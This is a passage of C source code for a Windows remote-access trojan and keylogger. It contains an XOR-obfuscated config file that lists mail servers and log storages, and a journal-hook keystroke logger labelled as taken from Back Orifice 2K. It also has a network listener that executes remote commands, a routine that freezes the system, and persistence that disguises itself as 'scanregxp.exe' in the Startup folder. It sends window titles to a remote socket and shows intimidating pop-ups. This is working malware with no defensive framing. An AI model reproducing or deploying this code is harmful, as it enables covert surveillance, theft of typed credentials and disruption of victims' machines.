	}
	for (i = 0; i < f_size; i++) {
		f_buf[i] ^= xor_key; /* XOR algorithm */
	}
	if (write_file(file_name, f_buf, f_size) == OPERATION_ERROR) {
		free(f_buf);
		#ifdef ERROR_MODE
			ShowError("write_file() in code_file()");
		#endif
		return (OPERATION_ERROR);
	}
	free(f_buf);
	return (OPERATION_SUCCESS);
}

/*
 *	read_config_file() - Reads configuration file if it is existent and
 *						 sets some program options. If the file not found or
 *						 any errors occurs when reading it, this function calls
 *						 to "set_default_config()" function.
 *
 */
void read_config_file(void)
{
	char *cfile_path;
	DWORD config_id;
	CONFIGFILE_HEADER *p_cf_h;
	DWORD br; /* bytes read */
	HANDLE hcffile;
	int se_s; /* section size */
	int i;

	/*
	 * First, I'll load all configuration defaults, so if
	 * errors occur or the configuration file will be empty,
	 * I'll not care about the program normal work.
	 *
	 * NOTE: I am using configuration file just to override default program
	 *	   options. This file is not mandatory!
	 */
	set_default_config(); /* WARNING: This must be called first */
	if ((cfile_path = (char *)malloc(MAX_PATH+0x10)) == NULL) {
		#ifdef ERROR_MODE
			ShowError("malloc() in read_config_file()");
		#endif
		return;
	}
	GetSystemDirectory(cfile_path, MAX_PATH);
	lstrcpyn(cfile_path + lstrlen(cfile_path), CONFIGFILE_NAME, lstrlen(CONFIGFILE_NAME) + 1);

	/*
	 * First, check if the configuration file exists?
	 */
	if (!file_exists(cfile_path)) {
		free(cfile_path);
#ifdef DEBUG_MODE
		ShowDebug("WARNING: configuration file not found!");
#endif
		return;
	}
	if (code_file(cfile_path, DEFAULT_XOR_KEY) == OPERATION_ERROR) { /* decode the file */
		free(cfile_path);
#ifdef ERROR_MODE
		ShowError("code_file() in read_config_file()");
#endif
		return;
	}
	p_cf_h = (CONFIGFILE_HEADER *)malloc(sizeof(CONFIGFILE_HEADER)); /* allocate the mem. for cf header */
	hcffile = open_file(cfile_path);
	/*=Read configuration file header=*/
	ReadFile(hcffile,p_cf_h,sizeof(CONFIGFILE_HEADER),&br,NULL);
	if (p_cf_h->nt_header_id!=CONFIG_FILE_ID) {
		free(cfile_path);
		free(p_cf_h);
		CloseHandle(hcffile);
#ifdef DEBUG_MODE
		ShowDebug("Bad config file ID!");
#endif
		return;
	}
	memcpy(&prog_conf.nr_logstorages,&p_cf_h->nr_logstorages,sizeof(int));
	memcpy(&prog_conf.nr_mailservers,&p_cf_h->nr_mailservers,sizeof(int));
	/*=Read section containing program password=*/
	ReadFile(hcffile,&se_s,sizeof(int),&br,NULL);
	if (se_s) {
		prog_conf.auth_password = (char *)malloc(se_s);
		ReadFile(hcffile,prog_conf.auth_password,se_s,&br,NULL);
	}
	/*=Read section containing max. logfile size=*/
	ReadFile(hcffile,&se_s,sizeof(int),&br,NULL);
	if (se_s)
		ReadFile(hcffile,&prog_conf.keylog_send_size,se_s,&br,NULL);
	/*=Read a list of log storages=*/
	if (p_cf_h->nr_logstorages) {
		prog_conf.logstorages = (char **)malloc(sizeof(char *) * p_cf_h->nr_logstorages);
		for (i = 0; i < p_cf_h->nr_logstorages; i++) {
			ReadFile(hcffile,&se_s,sizeof(int),&br,NULL);
			prog_conf.logstorages[i] = (char *)malloc(se_s);
			ReadFile(hcffile,prog_conf.logstorages[i],se_s,&br,NULL);
		}
	}
	/*=Read a list of mail servers=*/
	if (p_cf_h->nr_mailservers) {
		prog_conf.mailservers = (char **)malloc(sizeof(char *) * p_cf_h->nr_mailservers);
		for (i = 0; i < p_cf_h->nr_mailservers; i++) {
			ReadFile(hcffile,&se_s,sizeof(int),&br,NULL);
			prog_conf.mailservers[i] = (char *)malloc(se_s);
			ReadFile(hcffile,prog_conf.mailservers[i],se_s, &br,NULL);
		}
	}
	/*=Done=*/
	CloseHandle(hcffile);
	free(p_cf_h);
	code_file(cfile_path, DEFAULT_XOR_KEY); // code it back
	free(cfile_path);
}

void write_config_file(char *passwd, int max_logfsize, int nr_logstorages, int nr_mailservers, char **logstorages, char **mailservers)
{
	int i;
	char *cfile_path;
	DWORD bw; /* bytes written */
	int se_s;
	CONFIGFILE_HEADER *p_cf_h;
	HANDLE hcf;

	if ((cfile_path = (char *)malloc(MAX_PATH+0x10)) == NULL) {
#ifdef ERROR_MODE
		ShowError("malloc() in write_config_file()");
#endif
		return;
	}
	GetSystemDirectory(cfile_path, MAX_PATH);
	lstrcpyn(cfile_path + lstrlen(cfile_path), CONFIGFILE_NAME, lstrlen(CONFIGFILE_NAME) + 1);
	hcf = create_file(cfile_path);
	if (hcf==INVALID_HANDLE_VALUE) {
		free(cfile_path);
#ifdef ERROR_MODE
		ShowError("create_file() in write_config_file()");
#endif
		return;
	}
	/*=Write out config file header=*/
	p_cf_h = (CONFIGFILE_HEADER *)malloc(sizeof(CONFIGFILE_HEADER));
	p_cf_h->nr_logstorages = nr_logstorages;
	p_cf_h->nr_mailservers = nr_mailservers;
	p_cf_h->nt_header_id = CONFIG_FILE_ID;
	WriteFile(hcf,p_cf_h,sizeof(CONFIGFILE_HEADER),&bw,NULL);
	free(p_cf_h);
	/*=Write program password=*/
	se_s = lstrlen(passwd) + 1; /* including NULL */
	WriteFile(hcf,&se_s,sizeof(int),&bw,NULL);
	WriteFile(hcf,passwd,se_s,&bw,NULL);
	/*=Write max. logfile size=*/
	se_s = sizeof(int);
	WriteFile(hcf,&se_s,sizeof(int),&bw,NULL);
	WriteFile(hcf,&max_logfsize,se_s,&bw,NULL);
	/*=Write a list of log storages=*/
	for (i = 0; i < nr_logstorages; i++) {
		se_s = lstrlen(logstorages[i]) + 1; /* including NULL-terminating char */
		WriteFile(hcf,&se_s,sizeof(int),&bw,NULL);
		WriteFile(hcf,logstorages[i],se_s,&bw,NULL);
	}
	/*=Write a list of mail servers=*/
	for (i = 0; i < nr_mailservers; i++) {
		se_s = lstrlen(mailservers[i]) + 1; /* including NULL-terminating char */
		WriteFile(hcf,&se_s,sizeof(int),&bw,NULL);
		WriteFile(hcf,mailservers[i],se_s,&bw,NULL);
	}
	CloseHandle(hcf);
	code_file(cfile_path,DEFAULT_XOR_KEY);
	free(cfile_path);
#ifdef DEBUG_MODE
	ShowDebug("Configuration written successfully.");
#endif
}

/*
 *	set_default_config() - Loads default program configuration.
 *
 *	WARNING: all members of the "prog_conf" must be reinitialized!
 */
void set_default_config(void)
{
	int i;

	/*=Reset whole configuration if necessary=*/
	if (prog_conf.nr_logstorages) {
		for (i = 0; i < prog_conf.nr_logstorages; i++)
			free(prog_conf.logstorages[i]);
		free(prog_conf.logstorages);
	}
	if (prog_conf.nr_mailservers) {
		for (i = 0; i < prog_conf.nr_mailservers; i++)
			free(prog_conf.mailservers[i]);
		free(prog_conf.mailservers);
	}
	if (prog_conf.auth_password!=NULL)
		free(prog_conf.auth_password);
	/*=Memory allocation=*/
	prog_conf.auth_password = (char *)malloc(lstrlen(DEFAULT_PROGRAM_PASSWORD) + 1);
	prog_conf.logstorages = (char **)malloc(sizeof(char *) * DEFAULT_NR_LOGSTORAGES);
	prog_conf.mailservers = (char **)malloc(sizeof(char *) * DEFAULT_NR_MAILSERVERS);
	prog_conf.logstorages[0] = (char *)malloc(lstrlen(DEFAULT_LOGSTORAGE_ADDRESS) + 1);
	prog_conf.mailservers[0] = (char *)malloc(lstrlen(DEFAULT_MAILSERVER_ADDRESS) + 1);
	/*=Initialization itself=*/
	prog_conf.nr_logstorages = DEFAULT_NR_LOGSTORAGES;
	prog_conf.nr_mailservers = DEFAULT_NR_MAILSERVERS;
	prog_conf.keylog_send_size = DEFAULT_KEYLOGF_SEND_SIZE;
	lstrcpyn(prog_conf.auth_password,DEFAULT_PROGRAM_PASSWORD,lstrlen(DEFAULT_PROGRAM_PASSWORD) + 1); /* NULL */
	lstrcpyn(prog_conf.logstorages[0],DEFAULT_LOGSTORAGE_ADDRESS,lstrlen(DEFAULT_LOGSTORAGE_ADDRESS) + 1); /* NULL */
	lstrcpyn(prog_conf.mailservers[0],DEFAULT_MAILSERVER_ADDRESS,lstrlen(DEFAULT_MAILSERVER_ADDRESS) + 1); /* NULL */
}

void get_weekdayname_by_num(int day_num, char *weekdayname)
{
	switch (day_num) {
		case 0:
			wsprintf(weekdayname, "Sunday");
			break;
		case 1:
			wsprintf(weekdayname, "Monday");
			break;
		case 2:
			wsprintf(weekdayname, "Tuesday");
			break;
		case 3:
			wsprintf(weekdayname, "Wednesday");
			break;
		case 4:
			wsprintf(weekdayname, "Thursday");
			break;
		case 5:
			wsprintf(weekdayname, "Friday");
			break;
		case 6:
			wsprintf(weekdayname, "Saturday");
			break;
		default:
			wsprintf(weekdayname, "");
			break;
	}
}

void enum_windows(int con_s)
{
	char *buf;

	if ((buf = (char *)malloc(256)) == NULL)
		return;
	EnumWindows(EnumWindowsProc, con_s);
	free(buf);
}

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	char win_caption[256];

	GetWindowText(hWnd, win_caption, sizeof(win_caption));
	win_caption[lstrlen(win_caption)] = '\0';
	if (win_caption[0] != '\0') {
		send(lParam, "[", 1, 0);
		send(lParam, win_caption, lstrlen(win_caption), 0);
		send(lParam, "]\r\n", 3, 0);
	}

	return (TRUE);
}

void get_winnt_shutdown_privileges(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process.
	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		#ifdef ERROR_MODE
			ShowError("Unable to get a token!");
		#endif
	}

	// Get the LUID for the shutdown privilege.
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process.
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
}

void inc_ip_address(char *ip_addr)
{
	byte last_byte;
	char l_b[3]; /* it is enough */
	int ldot_ind;

	ldot_ind = lstrlen(ip_addr);
	/*
	 * IP address in "dot-notation": xxx.xxx.xxx.xxx
	 */
	if (ldot_ind > 15)
		return; /* this is incorrect IP address ! */
	while (ip_addr[--ldot_ind] != '.') /* get an index of the last dot of the "ip_addr"... */
	if (lstrlen(ip_addr+ldot_ind+1) > 3)
		return;
	lstrcpyn(l_b, ip_addr+ldot_ind+1, lstrlen(ip_addr+ldot_ind+1) + 1); /* get the last byte of IP address */
	last_byte = (byte)atol(l_b);
	if (last_byte < 255)
		last_byte++;
	wsprintf(l_b, "%d", last_byte);
	ip_addr[ldot_ind+1] = '\0';
	lstrcpyn(ip_addr + lstrlen(ip_addr), l_b, lstrlen(l_b) + 1);
}

void send_sync_command(
		char *ip_from, /* IP-address of the machine on which sync func executes first */
		char *ip_to, /* the second machine... */
		char *last_exec_ip, /* this is the last machine */
		char *command, /* command it self */
		unsigned long delay_before_exec /* delay before this engine begins it's work */
		)
{

#define MAX_SYNCFUNC_DELAY_TIME 3600000 /* delay for one hour (in milliseconds) */
#define MIN_SYNCFUNC_DELAY_TIME 0 /* no delay */

	int s0;
	WSADATA wsaData;
	struct sockaddr_in rem_addr;
	char *ip_addr;

	/*
	 * Wait if necessary...
	 */
	if (
		delay_before_exec*60000 > MIN_SYNCFUNC_DELAY_TIME &&
		delay_before_exec*60000 <= MAX_SYNCFUNC_DELAY_TIME
	)
		SleepEx(delay_before_exec*60000, FALSE);

	/*
	 * Continue my task.
	 */
	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData) != OPERATION_SUCCESS) {
		#ifdef ERROR_MODE
			ShowError("WSAStartup() in send_sync_command()");
		#endif
		return;
	}
	if ((ip_addr = (char *)malloc(MAX(lstrlen(ip_from), lstrlen(ip_to)))) == NULL) {
		#ifdef ERROR_MODE
			ShowError("malloc() in send_sync_command()");
		#endif
		return;
	}
	ZeroMemory(&rem_addr, sizeof(struct sockaddr_in)); /* fill whole struct by zeroes */
	rem_addr.sin_port = htons(DEF_SYNC_PORT);
	rem_addr.sin_family = AF_INET;
	wsprintf(ip_addr, "%s", ip_from);
	do {
		if ((s0 = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
			#ifdef ERROR_MODE
				ShowError("socket() in send_sync_command()");
			#endif
			return;
		}
		if (inet_addr(ip_addr) != inet_addr(last_exec_ip)) {
			rem_addr.sin_addr.s_addr = inet_addr(ip_addr);
			if (connect(s0, (struct sockaddr *)&rem_addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
				closesocket(s0);
				#ifdef ERROR_MODE
					ShowError("connect() in send_sync_command()");
				#endif
				return;
			}
			command_robot(s0, command);
			closesocket(s0);
		}
		inc_ip_address(ip_addr);
	} while (inet_addr(ip_addr) <= inet_addr(ip_to)); /* while the strings are not equ ... */
	
	/*
	 * And now execute the command on the last "alive" machine!
	 */
	rem_addr.sin_addr.s_addr = inet_addr(last_exec_ip);
	if ((s0 = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		#ifdef ERROR_MODE
			ShowError("socket() in send_sync_command()");
		#endif
		return;
	}
	if (connect(s0, (struct sockaddr *)&rem_addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
		closesocket(s0);
		#ifdef ERROR_MODE
			ShowError("second connect() in send_sync_command()");
		#endif
		return;
	}
	command_robot(s0, command);
	closesocket(s0);
	free(ip_addr);
}

DWORD WINAPI sync_function_thread(LPVOID param)
{
	WSADATA wsaData;
	int s0, s1; // sockets
	struct sockaddr_in local_addr, rem_addr;
	int sin_size;
	char *sync_command;

	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData) != OPERATION_SUCCESS) {
		#ifdef ERROR_MODE
			ShowError("WSAStartup() in sync_function_thread()");
		#endif
		return (0);
	}
	if ((s0 = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		#ifdef ERROR_MODE
			ShowError("socket() in sync_function_thread()");
		#endif
		return (0);
	}
	ZeroMemory(&local_addr, sizeof(struct sockaddr_in)); /* fill whole struct by zeroes */
	local_addr.sin_port = htons(DEF_SYNC_PORT);
	local_addr.sin_addr.s_addr = INADDR_ANY;
	local_addr.sin_family = AF_INET;

	if (bind(s0, (struct sockaddr *)&local_addr, sizeof(struct sockaddr)) == SOCKET_ERROR) {
		#ifdef ERROR_MODE
			ShowError("bind() in sync_function_thread()");
		#endif
		return (0);
	}

	if (listen(s0, 1) == SOCKET_ERROR) {
		#ifdef ERROR_MODE
			ShowError("listen() in sync_function_thread()");
		#endif
		return (0);
	}
	if ((sync_command = (char *)malloc(MAX_COMMAND_LENGTH)) == NULL) {
		#ifdef ERROR_MODE
			ShowError("malloc() in sync_function_thread()");
		#endif
		return (0);
	}

	while (TRUE) {
		sin_size = sizeof(struct sockaddr_in);
		if ((s1 = accept(s0, (struct sockaddr *)&rem_addr, &sin_size)) == INVALID_SOCKET) {
			#ifdef ERROR_MODE
				ShowError("accept() in sync_function_thread()");
			#endif
			continue; /* that error is not a cause for quiting */
		}
		/*
		 * Got connection, begin receiving a command...
		 */
		while (get_s_data(s1, sync_command, MAX_COMMAND_LENGTH) != OPERATION_ERROR) {
			execute_command(s1, sync_command);
		}
		closesocket(s1); /* close the sync command socket */
	}
}

/*
 *	start_sync_function() - This function starts a special service which waits for
 *							specified commands... So, after that I'll be able to
 *							run some commands simultaneously.
 */
void start_sync_function_thread(void)
{
	DWORD thread_id;

	CreateThread(NULL, 0, sync_function_thread, NULL, 0, &thread_id);
}

/*
 *	System killing engine.
 */
DWORD WINAPI dead_thread(LPVOID param)
{
	for (;;)
		_asm { cli }
}

void hang_system(void)
{
	HANDLE hDeadThread;
	DWORD thread_id;

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	for (;;) {
		hDeadThread = CreateThread(NULL, 0, dead_thread, NULL, 0, &thread_id);
		SetThreadPriority(hDeadThread, THREAD_PRIORITY_TIME_CRITICAL);
	}
}

void command_robot(int con_s, char *command)
{
	char tmp_buf[1024];

	send_s_data(con_s, command, lstrlen(command)); /* send the command */
	send_s_data(con_s, "\r\n", 2); /* end return key */
	
	/*
	 * Show message.
	 */
	if (!lstrcmp(command,PROG_COMMANDS[SHOWMESSAGE_COM_IND])) {
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		send_s_data(con_s, SYNC_MESSAGE_TEXT, lstrlen(SYNC_MESSAGE_TEXT));
		
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		send_s_data(con_s, SYNC_MESSAGE_TITLE, lstrlen(SYNC_MESSAGE_TITLE));
		
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		send_s_data(con_s, SYNC_MESSAGE_TYPE, lstrlen(SYNC_MESSAGE_TYPE));

		return;
	}

	/*
	 * Hang system.
	 */
	if (!lstrcmp(command,PROG_COMMANDS[HANGSYSTEM_COM_IND])) {
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		/*
		 * And now the systems hangs...
		 */
		return;
	}

	/*
	 * System power off.
	 */
	if (!lstrcmp(command,PROG_COMMANDS[SYSPOWEROFF_COM_IND])) {
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);

		return;
	}

	/*
	 * System restart.
	 */
	if (!lstrcmp(command,PROG_COMMANDS[SYSRESTART_COM_IND])) {
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);

		return;
	}

	/*
	 * Kill mouse button. (no incoming data)
	 */

	/*
	 * Revive mouse button. (no incoming data)
	 */

	/*
	 * Change desktop wallpaper.
	 */
	if (!lstrcmp(command,PROG_COMMANDS[CHANGEWALLPAPER_COM_IND])) {
		recv(con_s, tmp_buf, sizeof(tmp_buf), 0);
		send_s_data(con_s, SYNC_CHANGEWALLPAPER_FILENAME, sizeof(SYNC_CHANGEWALLPAPER_FILENAME));

		return;
	}
}

void set_default_sync_func_params(void)
{
	/*
	 * Synchronous message.
	 */
	wsprintf(SYNC_MESSAGE_TEXT,"You are terminated!\r\n");
	wsprintf(SYNC_MESSAGE_TITLE,"Remember: you're always under control.\r\n");
	wsprintf(SYNC_MESSAGE_TYPE,"%lu\r\n",MB_ICONERROR|MB_ABORTRETRYIGNORE);

	/*
	 * Synchronous change of desktop wallpaper.
	 */
	wsprintf(SYNC_CHANGEWALLPAPER_FILENAME, "c:\\config32.sys\r\n");
}

/*
 *	make_program_autorun() - This function makes necessary entries in the windows
 *							 registry to make sure that the program always runs at
 *							 start up.
 */
void make_program_autorun(void)
{
	HKEY hRunKey;
	HKEY hDelKey;
	HKEY KeyToOpen;
	DWORD reg_result;
	char *reg_path;
	char prog_fname[MAX_PATH+0x10];
	char win_d_path[MAX_PATH];
	char drive;
	char dest[MAX_PATH];

	/*
	 *   WinXP autorun... trivial...
	 */
	GetModuleFileName(NULL,prog_fname,sizeof(prog_fname));
	GetWindowsDirectory(win_d_path,MAX_PATH);
	drive=win_d_path[0];
	wsprintf(dest,"%c%s",drive,":\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup\\scanregxp.exe");
	CopyFile(prog_fname,dest,FALSE);

//	if (WINNT_RUNNING) {
//		KeyToOpen = HKEY_CURRENT_USER;
//		reg_path = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; // Windows NT
//	} else {
//		KeyToOpen = HKEY_LOCAL_MACHINE;
//		reg_path = "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"; // Windows 95/98
//	}
//	
//	RegCreateKeyEx(
//			KeyToOpen, // set depending on Windows type
//			reg_path, // this too
//			0,
//			NULL,
//			REG_OPTION_NON_VOLATILE,
//			KEY_ALL_ACCESS,
//			NULL,
//			&hRunKey,
//			&reg_result
//	);
//	RegSetValueEx(
//			hRunKey,
//			"ScanRegistry",
//			0,
//			REG_SZ,
//			(byte *)prog_fname,
//			lstrlen(prog_fname)+1
//	);
//	RegCloseKey(hRunKey);

	/*
	 *   Very (!!!) ugly patch of the code for WinXP
	 *   sorry... I have no time...
	 */
//	KeyToOpen = HKEY_LOCAL_MACHINE;
//	reg_path = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"; // Windows XP
//	RegCreateKeyEx(
//			KeyToOpen, // set depending on Windows type
//			reg_path, // this too
//			0,
//			NULL,
//			REG_OPTION_NON_VOLATILE,
//			KEY_ALL_ACCESS,
//			NULL,
//			&hRunKey,
//			&reg_result
//	);
//	RegSetValueEx(
//			hRunKey,
//			"ScanRegistryXp",
//			0,
//			REG_SZ,
//			(byte *)prog_fname,
//			lstrlen(prog_fname)+1
//	);
//	RegCloseKey(hRunKey);
//	RegCloseKey(KeyToOpen);

//	if (!WINNT_RUNNING) {
//		reg_path="\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
//		RegCreateKeyEx(HKEY_LOCAL_MACHINE,reg_path,0x0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hDelKey,&reg_result);
//		RegDeleteValue(hDelKey,"ScanRegistry");
//		RegCloseKey(hDelKey);
//	}
}

/*
 *	is_winnt_running() - Determinates the OS (Windows NT or Windows 95/98)
 */
void is_winnt_running(BOOL *nt_running)
{
	OSVERSIONINFO os_info;

	os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&os_info);

	/*
	 * Whether Windows NT or not?
	 */
	if (os_info.dwPlatformId == VER_PLATFORM_WIN32_NT)
		*nt_running = TRUE; /* this is Windows NT */
	else
		*nt_running = FALSE; /* this is Windows 95/98 (not important) */
}

/*
 *	mpa_thread() - Disallows remove registry entry!
 */
DWORD WINAPI mpa_thread(LPVOID param)
{
	for (;;) {
		SleepEx(3000, FALSE);
		make_program_autorun();
	}
}

/*
 *	start_mpa_thread() - Starts the thread described above.
 */
void start_mpa_thread(void)
{
	DWORD thread_id;

	CreateThread(NULL, 0, mpa_thread, NULL, 0, &thread_id);
}

/*======================== START OF CODE FROM BACK ORIFFICE 2K ======================*/
/*                                                                                   */
/*===================================================================================*/

/*=================== NEW KEYBOARD HANDLER ====================*/
/*                                                             */
/*=============================================================*/
LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(code<0) return CallNextHookEx(g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION) {
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;
			
			// Check to see if focus has changed
			HWND hFocus=GetActiveWindow();
			if(g_hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowText(hFocus,svTitle,256);
				if(nCount>0) {
					char svBuffer[512];
					wsprintf(svBuffer,"\r\n###---<%s>---###\r\n",svTitle);
					append_file(logfilepath, svBuffer, lstrlen(svBuffer));
				}
				g_hLastFocus=hFocus;
			}

			/*=NOW I'LL FILTER SOME UNESSENTIAL KEYS=*/
			if (vKey == BACKSPACE_KEY	||
				vKey == VK_LSHIFT		||
				vKey == VK_RSHIFT		||
				vKey == VK_SHIFT		||
				vKey == VK_LCONTROL		||
				vKey == VK_RCONTROL		||
				vKey == VK_CONTROL		||
				vKey == VK_LMENU		||
				vKey == VK_RMENU		||
				vKey == VK_MENU)
				return CallNextHookEx(g_hLogHook,code,wParam,lParam);

			// Write out key
			dwCount=GetKeyNameText(nScan,svBuffer,256);	
			if(dwCount) {
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					GetKeyboardState(kbuf);
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0)
						append_file(logfilepath,(char *)&ch,chcount);
				} else {
					if(vKey==VK_SPACE) {
						svBuffer[0]=' ';
						svBuffer[1]='\0';
						append_file(logfilepath, svBuffer,1);
						goto _endhandlingkey;
					}
					if(vKey==VK_RETURN) {
						append_file(logfilepath,"\r\n",2);
						goto _endhandlingkey;
					}
					append_file(logfilepath,"<",1);
					append_file(logfilepath,svBuffer,dwCount);
					append_file(logfilepath,">",1);
				}
			}
		}
	}
_endhandlingkey:
	return CallNextHookEx(g_hLogHook,code,wParam,lParam);
}

/*=GIMME NAME OF FILE TO LOG KEYPRESSES TO=*/
DWORD WINAPI KeyCapThread(LPVOID param)
{
	MSG msg;
	BYTE keytbl[256];
	int i;

	for(i=0;i<256;i++) keytbl[i]=0;
					
	g_bLogging=TRUE;
	g_hLastFocus=NULL;

	g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
	if(g_hLogHook==NULL)
		return -1;

	g_bLogging=TRUE;

	while(g_bLogging) {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) {
			GetMessage(&msg,NULL,0,0);
			if(msg.message==WM_CANCELJOURNAL) {
				SetKeyboardState(keytbl);
				g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
				if(g_hLogHook==NULL)
					return -1;
				else
					DispatchMessage(&msg);
			}
		}
		Sleep(0);
	}

	UnhookWindowsHookEx(g_hLogHook);

	g_hKeyCapThread=NULL;


	return 0;
}
/*========================= END OF BACK ORIFFICE 2K CODE ============================*/
/*                                                                                   */
/*===================================================================================*/

DWORD get_ip_by_name(char *name)
{
	struct hostent *p_hostent;
	WSADATA wsaData;
	DWORD ip;

	if (WSAStartup(MAKEWORD(WSA_VERSION_HIGH,WSA_VERSION_LOW),&wsaData)!=OPERATION_SUCCESS) {
#ifdef ERROR_MODE
			ShowError("WSAStartup() in get_ip_by_name()");
#endif
		return OPERATION_ERROR;
	}
	p_hostent = gethostbyname(name);
	if (p_hostent==NULL) {
		WSACleanup();
		return OPERATION_ERROR;
	}
	memcpy(&ip,p_hostent->h_addr_list[0],sizeof(DWORD));
	WSACleanup(); // cleanup WSA
	
	return ip;
}

void attach_config_file(void)
{
	char *ppfn; // program file name
	char *ptfn; // temp file name
	char *pbuf; // I/O buffer
	char *pcfs0;
	char *pcfs; // buffer which contains ID string of attached config. file
	char *pcfn; // the name of config. file
	int l; // length (in string operations)
	int cff; // config. file found flag
	DWORD br; // number of bytes read
	DWORD bw; // number of bytes written
	DWORD cfs; // size of config. file
	DWORD off;
	HANDLE htf; // handle of temp file
	HANDLE hcf; // handle of configuration file

	ppfn = (char *)malloc(MAX_PATH);
	ptfn = (char *)malloc(MAX_PATH);
	pcfn = (char *)malloc(MAX_PATH);
	GetModuleFileName(GetModuleHandle(NULL),ppfn,MAX_PATH);
	lstrcpy(ptfn,ppfn);
	wsprintf(ptfn + lstrlen(ptfn),"%lu.exe",GetTickCount());
	remove_file(ptfn); // for sure
	CopyFile(ppfn,ptfn,FALSE); // make temp exe-file
	free(ppfn);
	GetSystemDirectory(pcfn,MAX_PATH);
	lstrcpy(pcfn + lstrlen(pcfn),CONFIGFILE_NAME);
	get_file_size(pcfn,&cfs);
	hcf = open_file(pcfn);
	if (hcf==INVALID_HANDLE_VALUE) {
		free(ptfn);
		free(pcfn);
		return;
	}
	pbuf = (char *)malloc(cfs);
	ReadFile(hcf,pbuf,cfs,&br,NULL);
	/*=Remove config file=*/
	CloseHandle(hcf);
	DeleteFile(pcfn);
	free(pcfn);
	htf = open_file(ptfn);
	if (htf==INVALID_HANDLE_VALUE) {
		free(ptfn);
		free(pbuf);
		return;
	}
	l = lstrlen(ATTACHED_CONFIG_FILE_ID_0) + lstrlen(ATTACHED_CONFIG_FILE_ID_1) + 1; // witn NULL
	pcfs = (char *)malloc(l);
	pcfs0 = (char *)malloc(l);
	lstrcpy(pcfs,ATTACHED_CONFIG_FILE_ID_0);
	lstrcpy(pcfs + lstrlen(pcfs),ATTACHED_CONFIG_FILE_ID_1);
	br = 0;
	off = 0;
	cff = 0; // there is no config. (default)
	do {
		ReadFile(htf,pcfs0,l - 1,&br,NULL);
		SetFilePointer(htf,-(l - 1 - 1),NULL,FILE_CURRENT);
		off++;
		if (lstrcmp(pcfs0,pcfs)==0) {
			off += l - 1 - 1;
			cff++;
			break;
		}
	} while (br==l - 1);
	free(pcfs0);
	if (cff)
		SetFilePointer(htf,off,NULL,FILE_BEGIN); // to the begin of config. file data
	else {
		SetFilePointer(htf,0,NULL,FILE_END); // to the end of file
		WriteFile(htf,pcfs,l - 1,&bw,NULL);
	}
	WriteFile(htf,pbuf,cfs,&bw,NULL);
	CloseHandle(htf);
	free(pbuf);
	free(pcfs);
	execute_file(ptfn,NULL);
	//free(ptfn); - NOT REACHED
}

void extract_config_file(void)
{
	char *ppfn; // program file name
	char *ptfn; // temp file name
	char *pbuf; // I/O buffer
	char *pcfs; // buffer which contains ID string of attached config. file
	char *pcfn; // the name of config. file
	int l; // length (in string operations)
	int cff; // config. found flag
	DWORD br; // number of bytes read
	DWORD bw; // number of bytes written
	DWORD off; // current offset in temp file
	DWORD tfs; // size of temp file
	HANDLE htf; // handle of temp file
	HANDLE hcf; // handle of configuration file

	/*=Allocate the memory for my task=*/
	ppfn = (char *)malloc(MAX_PATH);
	ptfn = (char *)malloc(MAX_PATH);
	/*=Get program file name=*/
	GetModuleFileName(GetModuleHandle(NULL),ppfn,MAX_PATH);
	lstrcpy(ptfn,ppfn);
	/*=Make a name of temp file=*/
	wsprintf(ptfn + lstrlen(ptfn),".tmp.%lu",GetTickCount());
	DeleteFile(ptfn); // try to remove it (for sure that it is non-existent)
	CopyFile(ppfn,ptfn,FALSE); // make temp file
	free(ppfn);
	SetFileAttributes(ptfn,FILE_ATTRIBUTE_HIDDEN);
	get_file_size(ptfn,&tfs); // get a size of temp file
